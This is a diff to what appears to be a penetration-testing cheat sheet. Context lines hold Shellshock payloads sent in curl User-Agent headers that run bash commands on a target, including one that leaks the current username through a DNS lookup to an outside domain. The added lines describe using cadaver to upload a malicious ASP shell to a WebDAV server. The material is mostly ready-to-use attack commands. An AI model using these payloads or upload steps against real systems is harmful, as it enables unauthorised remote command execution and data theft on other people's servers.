@@ -530,3 +530,11 @@ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bas
 curl -A "() { :; };echo ;/bin/bash -c 'hostname'"  <IP>
 curl -A "() { :; }; /usr/bin/nslookup $(whoami).site.com" <IP>
 ```
+
+## WebDAV
+-> Connect to WebDAV server and send malicious file to shell
+```
+cadaver http://<IP>/webdav
+put <shell.asp>
+```
+https://github.com/notroj/cadaver
